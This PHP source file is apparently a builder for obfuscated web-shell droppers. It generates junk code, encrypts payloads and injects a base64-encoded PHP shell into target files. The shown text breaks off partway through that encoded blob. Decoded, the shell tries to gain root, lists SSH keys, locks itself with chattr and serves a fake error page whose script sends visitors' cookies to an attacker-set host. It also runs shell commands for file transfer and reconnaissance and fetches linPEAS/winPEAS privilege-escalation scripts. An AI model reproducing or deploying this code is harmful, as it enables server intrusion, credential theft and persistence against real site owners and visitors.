<?php
const alpha = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
const special  = '~!@#%^&*(){}[],./?';
const disallowed = '1234567890';
const allowed_chars = alpha;

class dynamic_generator
{

    private function genCert(int $CertStrength, string $certAlgo, string $keyType, string $digest, array $common)
    {
        if (!is_null($CertStrength) and is_int($CertStrength) and !is_null($certAlgo) and count($common) > 0) {
            if ($CertStrength < 4096) {
                echo "Are you sure you want such a small cert?\n";
                echo "This is for client auth and mutual tls, make sure its a bit higher.\n";
                return 0;
            } else {
                switch (strpos($keyType, "curve") or strpos($keyType, "prime") or strpos($keyType, "secp")) {
                    case true:
                        $keyInfo = array(
                            "private_key_type" => OPENSSL_KEYTYPE_EC,
                            "curve_name" => $keyType
                        );
                        break;
                    default:
                        $keyInfo = array(
                            "private_key_type" => $keyType,
                            "private_key_bits" => (int)$CertStrength
                        );
                        break;
                }
                $privKey = openssl_pkey_new($keyInfo);
                $csr = openssl_csr_new($common, $privKey, array("digest_alg" => $digest));
                $x509 = openssl_csr_sign($csr, null, $privKey, 365, array("digest_alg" => $digest));
                openssl_csr_export_to_file($csr, "YOURCSR.csr");
                openssl_x509_export_to_file($x509, "YOURX509CERT.crt");
                openssl_pkey_export_to_file($privKey, "YOURPRIVKEY.pem");
                echo "It is very important for you to know these are not password protected.\n";
                while (($e = openssl_error_string()) !== false) {
                    echo $e . "\n";
                }
                return array(
                    "Private Key" => base64_encode($privKey),
                    "CSR" => base64_encode($csr),
                    "X509" => base64_encode($x509)
                );
            }
        } else {
            throw new ErrorException("Missing Needed information. {$CertStrength} - {$certAlgo}");
        }
    }

    private function junkLoops(int $needsleep, int $sleep_depth): string
    {
        $for_looper = str_replace(disallowed, alpha, substr(str_shuffle(allowed_chars), 0, rand(3, 6)));
        $iterator = str_replace(disallowed, alpha, substr(str_shuffle(allowed_chars), 0, rand(3, 6)));
        $iterator_second = str_replace(disallowed, alpha, substr(str_shuffle(allowed_chars), 0, rand(3, 6)));
        $container = str_replace(disallowed, alpha, substr(str_shuffle(allowed_chars), 0, rand(3, 6)));
        $container_two = str_replace(disallowed, alpha, substr(str_shuffle(allowed_chars), 0, rand(3, 6)));
        $foreach_key = str_replace(disallowed, alpha, substr(str_shuffle(allowed_chars), 0, rand(3, 6)));
        $foreach_value = str_replace(disallowed, alpha, substr(str_shuffle(allowed_chars), 0, rand(3, 6)));
        $types = array(
            1 => "array",
            2 => "string",
            3 => "int"
        );
        $loop_types = array(
            1 => "while",
            2 => "if",
            3 => "for",
            4 => "foreach"
        );
        $operations = array(
            1 => "or",
            2 => "and",
            3 => "||",
            4 => "&&"
        );
        $checks = array(
            1 => "is_null",
            2 => "empty",
            3 => "isset",
        );
        $pos_neg = array(
            1 => "!",
            2 => ""
        );
        $sleeper = null;
        switch ($needsleep) {
            case 1:

                if ($sleep_depth >= 4.6) {
                    $sleep_length = rand(10000, 50000);
                } else {
                    $sleep_length = rand(1000, 9000);
                }
                $sleeper = <<<SLEEPER
    $loop_types[4] ( \$$for_looper as \$$foreach_key => \$$foreach_value ){
        for (\$$iterator = 0; \$$iterator < $sleep_length; \$$iterator++){
            \$$container = $sleep_length/2;
            \$$container_two = array();
            if (\$$iterator == \$$container and array_count_values(\$$container_two) != 10){
                array_push(\$$container_two, rand(1,500));
                \$$iterator = 0;
            }
            \$$iterator_second.=str_repeat("$iterator_second", 50);
        }
        return hash('whirlpool', \$_SERVER['SCRIPT_FILENAME'], FALSE);
    }
SLEEPER;
                break;
            case 2:
                $loo = $loop_types[rand(1, 2)];
                $che = $checks[rand(1, 3)];
                $opp = $operations[rand(1, 4)];
                $ty = $types[rand(1, 3)];
                $po = $pos_neg[rand(1, 2)];
                $sleeper = <<<SLEEPER2
    $loo($po$che(\$$iterator) $opp $po$che(\$$iterator_second) $opp ($ty)\$$container){
        $loo(\$$iterator $opp \$$iterator_second){
            return true;
        }
        $loo($po$che(\$$iterator_second)){
            return false;
        }
        $loo($po$che(\$$iterator)){
            return true;
        }
    }\n
SLEEPER2;
                break;
        }
        return $sleeper;
    }

    private function randomString()
    {
        $a = '';
        $f_name = str_replace(disallowed, alpha, substr(str_shuffle(allowed_chars), 0, rand(3, 17)));
        switch (rand(0, 15)) {
            case 0:
                $a = "function " . $f_name . "(string \$" . str_replace(disallowed, alpha, substr(str_shuffle(allowed_chars), 0, rand(3, 5))) . "){\n";
                for ($i = 0; $i <= rand(1, 15); $i++) {
                    $a .= "\t\$" . str_replace(disallowed, alpha, substr(str_shuffle(allowed_chars), 0, rand(3, 5))) . " = \"" . substr(str_shuffle(allowed_chars.special), 0, rand(25, 70)) . "\";\n";
                }
                $a .= "\treturn false;\n}\n\n";
                $a .= "{$f_name}('" . str_replace(disallowed, alpha, substr(str_shuffle(allowed_chars), 0, rand(3, 5))) . "');\n";
                break;
            case 1 | 3 | 5 | 7 | 9:
                $a = "\$" . str_replace(disallowed, alpha, substr(str_shuffle(allowed_chars), 0, rand(3, 5))) . " = \"" .substr(str_shuffle(allowed_chars.special), 0, rand(1,5)) . "\";\n";
                break;
            case 2 | 4 | 6 | 8 | 10:
                $a = "define('" . str_replace(disallowed, alpha, substr(str_shuffle(allowed_chars), 0, rand(3, 5))) . "', \"" . substr(str_shuffle(allowed_chars), 0, rand(3, 5)) . "\");\n";
                break;
            case 11:

                break;
            case 12:
                $a = "function " . $f_name . "(string \$" . str_replace(disallowed, alpha, substr(str_shuffle(allowed_chars), 0, rand(3, 5))) . "){\n";
                $a .= $this->junkLoops(rand(1, 2), rand(1, 5));
                $a .= "\t\n}\n\n";
                $a .= "{$f_name}('" . substr(str_shuffle(allowed_chars), 0, rand(3, 5)) . "');\n";
                break;
            case 13:
                $obfs_tmp = str_replace(disallowed, alpha, substr(str_shuffle(allowed_chars), 0, rand(3, 15)));
                $a = "\$" . $obfs_tmp . " = tmpfile();\nfwrite(\$" . $obfs_tmp . ",\"" . substr(str_shuffle(allowed_chars.special), 0, rand(3, 5)) . "\");\n";
                for ($i = 0; $i <= rand(1, 10); $i++) {
                    $a .= "fwrite(\$" . $obfs_tmp . ", \"" . base64_encode(substr(str_shuffle(allowed_chars.special), 0, rand(3, 5))) . "\");\n";
                }
                $a .= "fseek(\$" . $obfs_tmp . ", 0);\n";
                $a .= "\$" . str_replace(disallowed, alpha, substr(str_shuffle(allowed_chars), 0, rand(3, 5))) . " = file(\$" . $obfs_tmp . ");\n";
                $a .= "fclose(\$" . $obfs_tmp . ");\n";
                break;
            case 14:
                $a = "// why is it not launching??????\n";
                break;
            case 15:
                $yy = rand(1997, (int)date("Y"));
                $mo = rand(1, 12);
                $dd = rand(1, 31);
                $a = "//created: \n" . date("Y/m/d - l", mktime(null, null, null, $mo, $dd, $yy));
                break;
        }
        return $a;
    }

    private function encryptFile($fi)
    {
        $final_out = '';
        $algo = "aes-256-gcm";
        $pa = openssl_random_pseudo_bytes(32);
        $paHA = openssl_random_pseudo_bytes(128);
        $eyeV = openssl_random_pseudo_bytes((int)openssl_cipher_iv_length($algo));
        $t = hash_hmac("sha512", $paHA, $eyeV, $binary = true);
        if (!empty($fi) && is_file($fi)) {
            foreach (file($fi) as $line) {
                $final_out .= openssl_encrypt($line, $algo, $pa, OPENSSL_RAW_DATA | OPENSSL_ZERO_PADDING, $eyeV, $t, strlen($t));
            }
            $cm = gzencode($final_out);
            $GC = array(
                "Algo" => $algo,
                "Hmac Algo" => "sha512",
                "CT" => base64_encode($cm),
                "key" => base64_encode(bin2hex($pa)),
                "IV" => base64_encode(bin2hex($eyeV)),
                "Tag" => base64_encode(bin2hex($t))
            );
            return $GC;
        }
        return array(
            "Algo" => $algo,
            "CT" => false,
            "key" => false,
            "IV" => false,
            "Tag" => false
        );
    }

    function begin_junk($file, $depth, $out, $mode, bool $encrypt, string $checkInHost, int $checkInPort, int $checkInDuration, $slop)
    {
        $char_map_lower = array(
            "a" => "\\x61",
            "b" => "\\x62",
            "c" => "\\x63",
            "d" => "\\x64",
            "e" => "\\x65",
            "f" => "\\x66",
            "g" => "\\x67",
            "h" => "\\x68",
            "i" => "\\x69",
            "j" => "\\x6A",
            "k" => "\\x6B",
            "l" => "\\x6C",
            "m" => "\\x6D",
            "n" => "\\x6E",
            "o" => "\\x6F",
            "p" => "\\x70",
            "q" => "\\x71",
            "r" => "\\x72",
            "s" => "\\x73",
            "t" => "\\x74",
            "u" => "\\x75",
            "v" => "\\x76",
            "w" => "\\x77",
            "x" => "\\x78",
            "y" => "\\x79",
            "z" => "\\x7A",
            " " => "\\x20",
            "" => "\\x00",
            "!" => "\\x21",
            "?" => "\\x3F",
            "\"" => "\\x22",
            "'" => "\\x27",
            "\\" => "\\x5C",
            "/" => "\\x2F",
            "=" => "\\x3D",
            ">" => "\\x3E",
            "<" => "\\x3C",
            ":" => "\\x3A",
            ";" => "\\x3B",
            "-" => "\\x2D",
            "[" => "\\x5B",
            "]" => "\\x5D",
            "+" => "\\x2B",
            ")" => "\\x29",
            "(" => "\\x28",
            "%" => "\\x25",
            "^" => "\\x5E",
            "*" => "\\x2A",
            "&" => "\\x26",
            "#" => "\\x23",
            "@" => "\\x40",
            "`" => "\\x60",
            "~" => "\\x5F",
            "|" => "\\x7C",
            "}" => "\\x7D",
            "{" => "\\x7B",
            "\r" => "\\x0D",
            "\n" => "\\x0A",
            "$" => "\\x24",
            "_" => "\\x5F",
            "," => "\\x2C",
            "." => "\\x2E",
            "0" => "\\x30",
            "1" => "\\x31",
            "2" => "\\x32",
            "3" => "\\x33",
            "4" => "\\x34",
            "5" => "\\x35",
            "6" => "\\x36",
            "7" => "\\x37",
            "8" => "\\x38",
            "9" => "\\x39",
        );

        $b_encoded = array();
        if (!empty($file) and is_file($file) and !empty($depth)) {
            $la = file($file);
            if (isset($encrypt) && $encrypt === true) {
                $eXC = $this->encryptFile($slop);
                $la[16] = "define(\"UNPACKSELF\", base64decode(Z3pkZWNvZGUo).\"{$eXC['CT']}\")";
            } else {
                $la[16] = "define(\"UNPACKSELF\",\"PD9waHAKaW5pX3NldCgic2FmZV9tb2RlIiwgMCk7CnVtYXNrKDApOwpwb3NpeF9zZXR1aWQoMCk7CmRlZmluZSgiYmFzZSIsJ2VjaG8gIlVzZXJzIEhvbWUgRGlyOiI7ZWNobyAkSE9NRTtlY2hvIiI7ZWNobyAiU1NIIERpcmVjdG9yeT8iO2xzIC1sYWggJEhPTUUvLnNzaC87ZWNobyAiIjtlY2hvICJDdXJyZW50IERpcjogIjtwd2Q7bHMgLWxhaDtlY2hvICIiO2VjaG8gIlN5c3RlbTogIjt1bmFtZSAtYXM7ZWNobyAiIjtlY2hvICJVc2VyOiAiO3dob2FtaScpOwpzeXN0ZW0oImNoYXR0ciAraSAiLiAkX1NFUlZFUlsiU0NSSVBUX0ZJTEVOQU1FIl0pOwpmdW5jdGlvbiBiYW5uZXIoKXsKICAgIAogICAgZWNobygiXDAzM1szMzs0MG0gLuKWhOKWhCDCtyDiloTiloTilowgICAgICAgICDiloTiloTiloTCtyDiloTiloTiloTCtyDiloTCtyDiloTilowgICAgLuKWhOKWhCDCtyAg4paEIC7iloTiloTiloTiloQgLuKWhOKWhOKWjCAg4paE4paE4paMICAgXDAzM1swbVxuIik7CiAgICBlY2hvKCJcMDMzWzMzOzQwbSDilpDilogg4paALiDilojilojigKIgIOKWqiAgICAg4paQ4paIIOKWhOKWiOKWkOKWiCDiloTilojilpDilojilqrilojilojilowgICAg4paQ4paIIOKWgC4g4paI4paI4paq4paQ4paI4paA4paELuKWgMK34paI4paI4oCiICDilojilojigKIgICBcMDMzWzBtXG4iKTsKICAgIGVjaG8oIlwwMzNbMzM7NDBtIOKWhOKWgOKWgOKWgOKWiOKWhOKWiOKWiOKWqiAgIOKWhOKWiOKWgOKWhCAg4paI4paI4paAwrcg4paI4paI4paAwrfilpDilojilozilpDilojilqogICAg4paE4paA4paA4paA4paI4paE4paI4paI4paA4paQ4paI4paQ4paA4paA4paq4paE4paI4paI4paqICDilojilojilqogICBcMDMzWzBtXG4iKTsKICAgIGVjaG8oIlwwMzNbMzM7NDBtIOKWkOKWiOKWhOKWquKWkOKWiOKWkOKWiOKWjOKWkOKWjOKWkOKWiOKWjC7ilpDilozilpDilojilqrCt+KAouKWkOKWiOKWqsK34oCiIOKWkOKWiOKWgMK3LiAgICDilpDilojiloTilqrilpDilojilojilojilozilpDiloDilpDilojiloTiloTilozilpDilojilozilpDilozilpDilojilozilpDilowgXDAzM1swbVxuIik7CiAgICBlY2hvKCJcMDMzWzMzOzQwbSAg4paA4paA4paA4paAIC7iloDiloDiloAgIOKWgOKWiOKWhOKWgOKWqi7iloAgICAu4paAICAgICDiloAg4oCiICAgICAg4paA4paA4paA4paAIOKWgOKWgOKWgCDCtyDiloDiloDiloAgLuKWgOKWgOKWgCAu4paA4paA4paAICBcMDMzWzBtXG4iKTsKICAgIGVjaG8oImdyMzN0ejogTm90cm9vdCBKb2hubnk1XG5INHBweSBoNGNrMW5nXG5cblxuIik7CiAgICAKfQoKZnVuY3Rpb24gZGVuaWVkKHN0cmluZyAkZXJyaG9zdCkKewogZWNobyA8PDwgX1BPU1RET0MxCiAKIDwhRE9DVFlQRSBodG1sPgo8aHRtbD4KPGhlYWQ+CjxtZXRhIGh0dHAtZXF1aXY9InJlZnJlc2giIGNvbnRlbnQ9IjEwO3VybD0vIj4KPHRpdGxlPkVycm9yPC90aXRsZT4KPHN0eWxlPgogICAgYm9keSB7CiAgICAgICAgd2lkdGg6IDM1ZW07CiAgICAgICAgbWFyZ2luOiAwIGF1dG87CiAgICAgICAgZm9udC1mYW1pbHk6IFRhaG9tYSwgVmVyZGFuYSwgQXJpYWwsIHNhbnMtc2VyaWY7CiAgICB9Cjwvc3R5bGU+CjwhLS0gCiAgICAgY3VzdG9tIHNjcmlwdCBoZXJlLCB0byBoZWxwIGhhbmRsZSB0aGUgZXJyb3IgcmVxdWVzdC4gCiAgICAgbGlrZSBsb2dnaW5nIGVycm9yIGluZm9ybWF0aW9uLCBhbmQgZGlhZ25vc3RpYyBpbmZvcm1hdGlvbiBhYm91dCB0aGUgcmVtb3RlIGhvc3QuCiAtLT4KPCEtLSA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L25wbS9qYXZhc2NyaXB0LW9iZnVzY2F0b3IvZGlzdC9pbmRleC5icm93c2VyLmpzIj48L3NjcmlwdD4tLT4KPHNjcmlwdD4KCgpmdW5jdGlvbiBjb2xsZWN0RGlhZ25vc3RpY3MoKXsKICAgIHZhciBVcmwgPSAnaHR0cDovL1t5b3VyIGhvc3RdL2RpYWdIYW5kbGVyLnBocCc7IC8vIERvbid0IGZvcmdldCB0byBzZXQgdGhpcy4gVGhpcyB3aWxsIG5lZWQgdG8gYmUgeW91ciBkaWFnbm9zdGljIHNlcnZlci4KICAgIHZhciBvc05hbWUgPSAiVU5LIjsKICAgIGxldCBkaWFnQXIgPSBkb2N1bWVudC5jb29raWU7IC8vY29sbGVjdGluZyBhdXRoZW50aWNhdGlvbiBpbmZvcm1hdGlvbiwgZm9yIGRpYWdub3N0aWNzLgogICAgaWYgKG5hdmlnYXRvci5hcHBWZXJzaW9uLmluZGV4T2YoIldpbiIpICE9IC0xKSB7CiAgICAgICAgb3NOYW1lID0gIldpbmRvd3MiCiAgICAgICAgdmFyIGRpYWcgPSB7ICJvTmFtZSI6IG9zTmFtZSwgImNvIjogZGlhZ0FyLCAiUmhvc3QiOiAiJGVycmhvc3QiIH0KICAgICAgICAgICAgaWYgKG9zTmFtZSAhPT0gJycpewogICAgICAgIGlmICh3aW5kb3cuWE1MSHR0cFJlcXVlc3QpewogICAgICAgICAgICAvLyBzZW5kaW5nIGRpYWcgaW5mb3JtYXRpb24gdGhyb3VnaCB4bWwgcmVxdWVzdCwgYXMgdG8gbm90IGRlbGF5IHVzZXIgZXhwZXJpZW5jZS4KICAgICAgICAgICAgeG1saHR0cCA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwogICAgICAgIH1lbHNlewogICAgICAgICAgICB4bWxodHRwID0gbmV3IEFjdGl2ZVhPYmplY3QoIk1pY3Jvc29mdFhNTEhUVFAiKTsKICAgICAgICB9CiAgICAgICAganNvblAgPSBKU09OLnN0cmluZ2lmeShkaWFnKTsKICAgICAgICB4bWxodHRwLm9wZW4oIkdFVCIsIFVybCtqc29uUCk7CiAgICAgICAgeG1saHR0cC5zZXRSZXF1ZXN0SGVhZGVyKCJDb250ZW50LVR5cGUiLCAiYXBwbGljYXRpb24vanNvbiIpOwogICAgICAgIHhtbGh0dHAub25yZWFkeXN0YXRlY2hhbmdlID0gZnVuY3Rpb24gKCl7CiAgICAgICAgICAgIGlmICh0aGlzLnN0YXR1cyA9PT0gMjAwKXsKICAgICAgICAgICAgfWVsc2V7CiAgICAgICAgICAgICAgICBjb25zb2xlLmxvZyh0aGlzLmVycm9yVGV4dCk7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgeG1saHR0cC5zZW5kKCk7CiAgICB9CiAgICB9ZWxzZSBpZiAobmF2aWdhdG9yLmFwcFZlcnNpb24uaW5kZXhPZigiTWFjIikgIT0gLTEpIHsKICAgICAgICBvc05hbWUgPSAiTWFjL09TWCIKICAgICAgICB2YXIgZGlhZyA9IHsib05hbWUiOiBvc05hbWUsICJjbyI6IGRpYWdBciwgIlJob3N0IjogIiRlcnJob3N0IiB9CiAgICAgICAgdmFyIGpzb25QID0gSlNPTi5zdHJpbmdpZnkoZGlhZyk7CiAgICAgICAgY29uc3QgTWV0aG9kID0gewogICAgICAgICAgICBoZWFkZXJzOnsKICAgICAgICAgICAgICAgICJjb250ZW50LXR5cGUiOiJhcHBsaWNhdGlvbi9qc29uOyBjaGFyc2V0PVVURi04IgogICAgICAgICAgICB9LAogICAgICAgICAgIG1ldGhvZDoiR0VUIgogICAgICAgIH0KICAgICAgICBmZXRjaChVcmwrIj9xPSIranNvblAsIE1ldGhvZCkKICAgIH1lbHNlIGlmIChuYXZpZ2F0b3IuYXBwVmVyc2lvbi5pbmRleE9mKCJYMTEiKSAhPSAtMSkgewogICAgICAgIG9zTmFtZSA9ICJMaW51eCIKICAgICAgICB2YXIgZGlhZyA9IHsgIm9OYW1lIjogb3NOYW1lLCAiY28iOiBkaWFnQXIsICJSaG9zdCI6ICIkZXJyaG9zdCIgfQogICAgICAgIHZhciBqc29uUCA9IEpTT04uc3RyaW5naWZ5KGRpYWcpOwogICAgICAgIGNvbnN0IE1ldGhvZCA9IHsKICAgICAgICAgICAgaGVhZGVyczp7CiAgICAgICAgICAgICAgICAiY29udGVudC10eXBlIjoiYXBwbGljYXRpb24vanNvbjsgY2hhcnNldD1VVEYtOCIKICAgICAgICAgICAgfSwKICAgICAgICAgICBtZXRob2Q6IkdFVCIKICAgICAgICB9CiAgICAgICAgZmV0Y2goVXJsKyI/cT0iK2pzb25QLCBNZXRob2QpCiAgICB9ZWxzZSBpZiAobmF2aWdhdG9yLmFwcFZlcnNpb24uaW5kZXhPZigiVW5peCIpICE9IC0xKSB7CiAgICAgICAgb3NOYW1lID0gIlVuaXgiCiAgICAgICAgdmFyIGRpYWcgPSB7ICJvTmFtZSI6IG9zTmFtZSwgImNvIjogZGlhZ0FyLCAiUmhvc3QiOiAiJGVycmhvc3QiIH0KICAgICAgICB2YXIganNvblAgPSBKU09OLnN0cmluZ2lmeShkaWFnKTsKICAgICAgICBjb25zdCBNZXRob2QgPSB7CiAgICAgICAgICAgIGhlYWRlcnM6ewogICAgICAgICAgICAgICAgImNvbnRlbnQtdHlwZSI6ImFwcGxpY2F0aW9uL2pzb247IGNoYXJzZXQ9VVRGLTgiCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgbWV0aG9kOiJHRVQiCiAgICAgICAgfQogICAgICAgIGZldGNoKFVybCsiP3E9Iitqc29uUCwgTWV0aG9kKQogICAgfWVsc2V7CiAgICAgICAgb3NOYW1lID0gIlVOSyIKICAgICAgICB2YXIgZGlhZyA9IHsgIm9OYW1lIjogb3NOYW1lLCAiY28iOiBkaWFnQXIsICJSaG9zdCI6ICIkZXJyaG9zdCIgfQogICAgICAgIHZhciBqc29uUCA9IEpTT04uc3RyaW5naWZ5KGRpYWcpOwogICAgICAgIGNvbnN0IE1ldGhvZCA9IHsKICAgICAgICAgICAgaGVhZGVyczp7CiAgICAgICAgICAgICAgICAiY29udGVudC10eXBlIjoiYXBwbGljYXRpb24vanNvbjsgY2hhcnNldD1VVEYtOCIKICAgICAgICAgICAgfSwKICAgICAgICAgICBtZXRob2Q6IkdFVCIKICAgICAgICB9CiAgICAgICAgZmV0Y2goVXJsKyI/cT0iK2pzb25QLCBNZXRob2QpCiAgICB9Cn0KY29sbGVjdERpYWdub3N0aWNzKCkKPC9zY3JpcHQ+CjwhLS0gcmVtb3RlIHJlc291cmNlIGhlcmUuIC0tPgo8c2NyaXB0IHNyYz0ncnNyYy5qcyc+PC9zY3JpcHQ+CjwvaGVhZD4KPGJvZHk+CjxoMT5BbiBlcnJvciBvY2N1cnJlZC48L2gxPgo8cD5Tb3JyeSwgdGhlIHBhZ2UgeW91IGFyZSBsb29raW5nIGZvciBpcyBjdXJyZW50bHkgdW5hdmFpbGFibGUgdG8geW91Ljxici8+ClBsZWFzZSB0cnkgYWdhaW4gbGF0ZXIuPC9wPgo8cD5JZiB5b3UgYXJlIHRoZSBzeXN0ZW0gYWRtaW5pc3RyYXRvciBvZiB0aGlzIHJlc291cmNlIHRoZW4geW91IHNob3VsZCBjaGVjawp0aGUgZXJyb3IgbG9nIGZvciBkZXRhaWxzLjwvcD4KPHA+UmVkaXJlY3RpbmcgeW91IHRvIHRoZSBob21lIHBhZ2UgaW4gMTAgc2Vjb25kcy48L3A+CjwvYm9keT4KPC9odG1sPgoKX1BPU1RET0MxOwoKfQoKZnVuY3Rpb24gYjY0KCR0YXJnZXQsICRob3csICRkYXRhLCAkZXh0LCAkZGlyKQp7Ci8qICAqICAgKiAgICogICAqICAgKiAgICogICAqICAgKiAgICogICAqICAgKiAgICogICAqICAgKiAgICogICAqICAgKiAgICogICAqICAgKiAgICogICAqICAgKiAgICogICAqICAgKiAgICogICAqICAgKiAgICogICAqICAgKiAgICogICAqICAgKiAgICoKKiAgICAgICBTbywgdGhpcyBpc24ndCBwcmV0dHksIG9yIGVsZWdhbnQuIEl0cyBkZXNpZ25lZCB0byB3b3JrLCBhbmQgdGhlIGJhc2U2NCAtdzAgd29ya3MgdGhlIGJlc3QgZnJvbSB3aGF0IGkgaGF2ZSBzZWVuLCBtYWtlcyB0aGUgZmlsZSBtdWNoICAgKgoqICAgICAgIGVhc2llciB0byB0cmFuc3BvcnQgYWNyb3NzIGh0dHAvaHR0cHMsIGFzIGl0IHN0cmlwcyB0aGUgbmV3bGluZXMgb3V0IG9mIHRoZSBlbmQgcmVzdWx0LiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAqCiogICAqICAgKiAgICogICAqICAgKiAgICogICAqICAgKiAgICogICAqICAgKiAgICogICAqICAgKiAgICogICAqICAgKiAgICogICAqICAgKiAgICogICAqICAgKiAgICogICAqICAgKiAgICogICAqICAgKiAgICogICAqICAgKiAgICogICAqICAgKiAgICovCiAgICBpZiAoIWVtcHR5KCRob3cpICYmICFlbXB0eSgkdGFyZ2V0KSAmJiAhZW1wdHkoJGRpcikpIHsKICAgICAgICBpZiAoIWVtcHR5KCRkYXRhKSAmJiAkaG93ID09ICJ1cCIpIHsKICAgICAgICAgICAgZWNobygiU3RhcnRpbmcgdG8gZGVjb2RlIGJhc2U2NFxuIik7CiAgICAgICAgICAgIHNoZWxsX2V4ZWMoImVjaG8gIiAuICRkYXRhIC4gInwgYmFzZTY0ID4+ICIgLiAkZGlyIC4gIi8iIC4gJHRhcmdldCAuICJfYmFja3VwLiIgLiAkZXh0KSBvciBkaWUoIkVycm9yIG9uIHVwbG9hZC5cbiIpOwogICAgICAgIH0gZWxzZWlmICgkaG93ID09ICJkb3duIiAmJiAhZW1wdHkoJGRhdGEpICYmICFlbXB0eSgkZGlyKSkgewogICAgICAgICAgICBlY2hvKCJTdGFydGluZyBiYXNlNjQgZW5jb2RpbmdcbiIpOwogICAgICAgICAgICBzaGVsbF9leGVjKCJiYXNlNjQgLXcwICIgLiAkZGlyIC4gIi8iIC4gJHRhcmdldCAuICIgPj4gIiAuIGdldGN3ZCgpIC4gJHRhcmdldCAuICJfYmFja3VwLmI2NCIpIG9yIGRpZSgiRXJyb3Igb24gYnVpbGRpbmcgdGhlIGRvd25sb2FkLlxuIik7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgZWNobygiQ2Fubm90IGRvIHdoYXQgeW91IGFza2VkIG9mIG1lLlxuIik7CiAgICAgICAgfQogICAgfQp9CgpmdW5jdGlvbiBjaGVja0NvbXMoKQp7CiAgICBlY2hvICJbICEhIF1BdmFpbCBDb21tYW5kczogWyAhISBdXG4iOwogICAgJGxpbmNvbW1hbmRzID0gYXJyYXkoCiAgICAgICAgInBlcmwiLCAncHl0aG9uJywgJ3BocCcsICdteXNxbCcsICdwZ19jdGwnLCAnd2dldCcsICdjdXJsJywgJ2x5bngnLCAndzNtJywgJ2djYycsICdnKysnLAogICAgICAgICdjb2JjJywgJ2phdmFjJywgJ21hdmVuJywgJ2phdmEnLCAnYXdrJywgJ3NlZCcsICdmdHAnLCAnc3NoJywgJ3Ztd2FyZScsICd2aXJ0dWFsYm94JywKICAgICAgICAncWVtdScsICdzdWRvJywgImdpdCIsICJ4dGVybSIsICJ0Y2wiLCAicnVieSIsICJwb3N0Z3JlcyIsICJtb25nbyIsICJjb3VjaGRiIiwKICAgICAgICAiY3JvbiIsICJhbmFjcm9uIiwgInZpc3VkbyIsICJtYWlsIiwgInBvc3RmaXgiLCAiZ2F3ayIsICJiYXNlNjQiLCAidXVpZCIsICJwZ19sc2NsdXN0ZXJzIiwKICAgICAgICAicGdfY3RsY2x1c3RlciIsInBnX2NsdXN0ZXJjb25mIiwgInBnX2NvbmZpZyIsICJwZyIsICJwZ192aXJ0dWFsZW52IiwgInBnX2lzcmVhZHkiLCAicGdfY29uZnRvb2wiCiAgICApOwogICAgZm9yZWFjaCAoJGxpbmNvbW1hbmRzIGFzICRpdGVtKSB7CiAgICAgICAgZWNobyhzaGVsbF9leGVjKCJ3aGljaCAiIC4gJGl0ZW0pKTsKICAgIH0KfQoKZnVuY3Rpb24gcGFyc2VQcm90ZWN0aW9ucygpCnsKICAgIGVjaG8gIlByb3RlY3Rpb25zOiBcbiI7CiAgICAkcHJvdGVjdGlvbnMgPSBhcnJheSgKICAgICAgICAic2VsaW51eCIsICJpcHRhYmxlcyIsICJwZmN0bCIsICJmaXJld2FsbGQiLCAieWFzdCIsICJ5YXN0MiIsICJmYWlsMmJhbiIsICJkZW55aG9zdCIsICJuZnRhYmxlcyIsICJmaXJld2FsbC1jbWQiCiAgICApOwogICAgZm9yZWFjaCAoJHByb3RlY3Rpb25zIGFzICRwcm90KSB7CiAgICAgICAgZWNobyhzaGVsbF9leGVjKCJ3aGljaCAiIC4gJHByb3QpKTsKICAgIH0KfQoKZnVuY3Rpb24gY2hlY2tTaGVsbHMoKQp7CiAgICAkc2hlbGxzID0gYXJyYXkoImtzaCIsICJjc2giLCAienNoIiwgImJhc2giLCAic2giLCAidGNzaCIpOwogICAgZWNobygiU2hlbGxzOlxuIik7CiAgICBmb3JlYWNoICgkc2hlbGxzIGFzICRzaGVsbCkgewogICAgICAgIGVjaG8oc2hlbGxfZXhlYygid2hpY2ggIiAuICRzaGVsbCkpOwogICAgfQp9CgpmdW5jdGlvbiBjaGVja1BhY2soKQp7CiAgICAkcGFja3MgPSBhcnJheSgKICAgICAgICAienlwcGVyIiwgInl1bSIsICJwYWNtYW4iLCAiYXB0IiwgImFwdC1nZXQiLCAicGtnIiwgInBpcCIsICJwaXAyIiwgInBpcDMiLCAiZ2VtIiwgImNhcmdvIiwgIm51Z2V0IiwgImFudCIsICJlbWVyZ2UiLCAiZ28iCiAgICApOwogICAgZm9yZWFjaCAoJHBhY2tzIGFzICRwYWNrKSB7CiAgICAgICAgZWNobyhzaGVsbF9leGVjKCJ3aGljaCAiIC4gJHBhY2spKTsKICAgIH0KfQoKZnVuY3Rpb24gY2xvbmVyKCRyZXBvLCAkb3MpCnsKICAgICRyZXBvcyA9IGFycmF5KAogICAgICAgICJsaW51eCIgPT4gImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9jYXJsb3Nwb2xvcC9wcml2aWxlZ2UtZXNjYWxhdGlvbi1hd2Vzb21lLXNjcmlwdHMtc3VpdGUvbWFzdGVyL2xpblBFQVMvbGlucGVhcy5zaCIsCiAgICAgICAgIldpbkJBVCIgPT4gImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9jYXJsb3Nwb2xvcC9wcml2aWxlZ2UtZXNjYWxhdGlvbi1hd2Vzb21lLXNjcmlwdHMtc3VpdGUvbWFzdGVyL3dpblBFQVMvd2luUEVBU2JhdC93aW5QRUFTLmJhdCIsCiAgICAgICAgIldpbkVYRUFOWSIgPT4gImh0dHBzOi8vZ2l0aHViLmNvbS9jYXJsb3Nwb2xvcC9wcml2aWxlZ2UtZXNjYWxhdGlvbi1hd2Vzb21lLXNjcmlwdHMtc3VpdGUvYmxvYi9tYXN0ZXIvd2luUEVBUy93aW5QRUFTZXhlL3dpblBFQVMvYmluL09iZnVzY2F0ZWQlMjBSZWxlYXNlcy93aW5QRUFTYW55LmV4ZSIsCiAgICAgICAgImRlZmF1bHQiID0+ICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vQW5vbi1F